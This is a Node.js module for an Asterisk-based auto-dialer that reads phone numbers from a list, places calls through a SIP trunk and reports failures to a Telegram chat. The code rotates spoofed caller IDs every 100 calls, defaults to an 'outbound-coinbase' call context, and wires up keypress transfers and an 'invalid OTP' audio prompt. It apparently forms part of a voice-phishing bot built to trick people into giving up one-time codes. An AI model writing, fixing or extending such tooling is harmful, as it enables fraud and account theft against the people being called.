const {
    get_bot
} = require("../telegram_bot/botInstance");
const {
    add_entry_to_memory,
    pop_unprocessed_line,
} = require("../utils/entries");
const {
    sanitize_phoneNumber
} = require("../utils/sanitization");
const {
    get_settings
} = require("../utils/settings");
const {
    ami
} = require("./instance");
const Campaign = require("../models/campaign");

let hasLoggedAllLines = false;

module.exports = async (entry) => {
    if (!entry) {
        if (!hasLoggedAllLines) {
            const bot = get_bot();
            const settings = get_settings();

            /*bot.sendMessage(
              settings?.notifications_chat_id,
              `✅ All lines have been called`,
              {
                parse_mode: "HTML",
              }
            );*/
            hasLoggedAllLines = true;
        }
        return;
    }

    const number = sanitize_phoneNumber(entry?.phoneNumber);
    const settings = get_settings();
    add_entry_to_memory({
        ...entry,
        phoneNumber: number
    });

    const actionId = `call-${number}-${Date.now()}`;

    // Get the SIP trunk name and caller ID from settings
    const sipTrunk = settings.sip_trunk;
    const trunkName = sipTrunk ? sipTrunk.name : 'main';
    let callerId = settings.caller_id || number;
    const dialPrefix = settings.dial_prefix || '';

    const dialedNumber = dialPrefix + number;

    let campaign;
    // ANI rotation logic
    if (settings.campaign_id && callerId && callerId.length >= 4) {
        campaign = await Campaign.findByPk(settings.campaign_id);
        if (campaign) {
            // Increment call counter
            await campaign.increment('callCounter');
            await campaign.increment('totalCalls');

            // Check if rotation is ENABLED and we need to rotate (every 100 calls)
            if (campaign.callerIdRotation && campaign.callCounter % 100 === 0) {
                // Generate random last 4 digits
                const randomLast4 = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
                // Use prefix if set, otherwise use original caller ID minus last 4
                const prefix = campaign.callerIdPrefix || callerId.substring(0, callerId.length - 4);
                callerId = prefix + randomLast4;
                console.log(`ANI Rotation ENABLED: Original ${settings.caller_id} -> New ${callerId} (Call #${campaign.callCounter})`);
            } else if (campaign.callerIdRotation) {
                console.log(`ANI Rotation ENABLED but not rotating (Call #${campaign.callCounter}/100)`);
            } else {
                console.log(`ANI Rotation DISABLED - using static caller ID: ${callerId}`);
            }
        }
    }

    console.log(`Ringing number ${number} using trunk: ${trunkName} with Caller ID: ${callerId}`);

    const variables = {
        callId: actionId,
        TRUNK_NAME: trunkName,
        CAMPAIGN_ID: String(settings.campaign_id || 'default'),
        CAMPAIGN_CALLERID: callerId,
        DTMF_DIGIT: settings.dtmf_digit || '1',
        DESTINATION: number,
        TRANSFER_ENABLED: campaign.transferEnabled ? 'true' : 'false',
        TRANSFER_NUMBER: campaign.transferNumber || '',
        PRESS1_AUDIO_FILE: campaign.press1_audio_file ? campaign.press1_audio_file.replace('.wav', '') : '',
        PRESS1_TRANSFER_ENABLED: campaign.press1TransferEnabled ? 'true' : 'false',
        PRESS1_TRANSFER_NUMBER: campaign.press1TransferNumber || '',
        PRESS2_AUDIO_FILE: campaign.press2_audio_file ? campaign.press2_audio_file.replace('.wav', '') : '',
        PRESS2_TRANSFER_ENABLED: campaign.press2_transfer_enabled ? 'true' : 'false',
        PRESS2_TRANSFER_NUMBER: campaign.press2_transfer_number || '',
        INVALID_OTP_AUDIO_FILE: campaign.invalid_otp_audio_file ? campaign.invalid_otp_audio_file.replace('.wav', '') : '',
        INVALID_OTP_TRANSFER_ENABLED: campaign.invalid_otp_transfer_enabled ? 'true' : 'false',
        INVALID_OTP_TRANSFER_NUMBER: campaign.invalid_otp_transfer_number || '',
        MOH_AUDIO_FILE: campaign.moh_audio_file ? campaign.moh_audio_file.replace('.wav', '') : '',
        PRESS0_AUDIO_FILE: campaign.press0_audio_file ? campaign.press0_audio_file.replace('.wav', '') : '',
        PRESS0_TRANSFER_ENABLED: campaign.press0_transfer_enabled ? 'true' : 'false',
        PRESS0_TRANSFER_NUMBER: campaign.press0_transfer_number || ''
    };
    // Add IVR files if they exist
    if (settings.ivr_intro_file) {
        variables.__CAMPAIGN_INTRO = settings.ivr_intro_file;
    }
    if (settings.ivr_outro_file) {
        variables.__CAMPAIGN_OUTRO = settings.ivr_outro_file;
    }

    ami.action({
            action: "Originate",
            channel: `SIP/${trunkName}/${dialedNumber}`,
            context: `outbound-${settings?.agent || "coinbase"}`,
            exten: number,
            priority: 1,
            actionid: actionId,
            variable: Object.entries(variables).map(([key, value]) => `${key}=${value}`),
            CallerID: callerId,
            async: true,
        },
        (err, res) => {
            if (err) {
                console.error("Originate Error:", err);

                // Update failed calls counter
                if (settings.campaign_id) {
                    Campaign.increment('failedCalls', {
                        where: {
                            id: settings.campaign_id
                        }
                    });
                }

                const bot = get_bot();
                bot.sendMessage(
                    settings?.notifications_chat_id,
                    `❌ Failed to call ${number}\n` +
                    `Error: ${err.message}\n` +
                    `Trunk: ${trunkName}\n` +
                    `${dialPrefix ? `Prefix: ${dialPrefix}\n` : ''}` +
                    `Caller ID: ${callerId}`, {
                        parse_mode: "HTML"
                    }
                );

                require("./call")(pop_unprocessed_line());
            } else {
                console.log("Originate Response:", res);

                /*const bot = get_bot();
        bot.sendMessage(
          settings?.notifications_chat_id,
          `📞 Calling ${number}\n` +
          `Trunk: ${trunkName}\n` +
		  `${dialPrefix ? `Prefix: ${dialPrefix}\n` : ''}` +
          `Caller ID: ${callerId}`,
          { parse_mode: "HTML" }
        );*/
            }
        }
    );

    hasLoggedAllLines = false;
};